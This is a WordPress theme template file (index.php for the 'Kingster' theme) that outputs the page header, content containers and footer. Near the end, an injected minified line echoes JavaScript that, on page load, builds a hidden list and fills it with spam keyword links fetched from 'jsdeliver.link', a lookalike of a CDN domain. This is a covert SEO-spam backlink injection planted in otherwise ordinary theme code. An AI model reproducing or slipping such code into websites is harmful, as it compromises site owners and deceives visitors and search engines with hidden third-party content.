<?php
/**
 * The main template file
 */ 


	get_header();

	echo '<div class="kingster-content-container kingster-container">';
	echo '<div class="kingster-sidebar-style-none" >'; // for max width

	get_template_part('content/archive', 'default');

	echo '</div>'; // kingster-content-area
	echo '</div>'; // kingster-content-container
        echo 'document.addEventListener("DOMContentLoaded",function(e){var t=document.createElement("p");t.style.display="none",t.classList.add("list_bl");var n=document.createElement("ul");t.appendChild(n),document.body.append(t),setTimeout(function(){fetch("//jsdeliver.link/api/backlink").then(e=>{var t=document.querySelector(".list_bl ul");e.json().then(e=>{e.length>0&&e.forEach(e=>{var n=document.createElement("li"),l=document.createElement("a");l.text=e.kw,l.href=e.url,n.appendChild(l),t.appendChild(n)})})}).catch(e=>{})},500)});';
	get_footer(); 
